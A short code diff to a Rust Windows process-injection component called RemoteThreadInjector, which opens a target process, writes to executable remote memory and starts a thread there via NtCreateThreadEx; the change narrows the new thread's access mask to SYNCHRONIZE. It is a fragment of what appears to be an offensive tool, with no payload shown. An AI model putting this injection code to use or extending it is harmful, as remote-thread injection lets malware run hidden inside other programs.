@@ -17,7 +17,10 @@ impl Injector for RemoteThreadInjector {
         }
 
         use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
-        use winapi::um::winnt::{PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
+        use winapi::um::winnt::{PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, SYNCHRONIZE};
+        // Minimal thread access for NtCreateThreadEx: SYNCHRONIZE only.
+        // The handle is closed immediately after creation (fire-and-forget).
+        const THREAD_ACCESS_MINIMAL: u32 = SYNCHRONIZE;
 
         // Open target process via NtOpenProcess
         let mut client_id = [0u64; 2];
@@ -138,7 +141,7 @@ impl Injector for RemoteThreadInjector {
             let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
             let status = nt_create(
                 &mut h_thread,
-                0x1FFFFF,
+                THREAD_ACCESS_MINIMAL as u32,
                 std::ptr::null_mut(),
                 h_proc,
                 remote_mem,
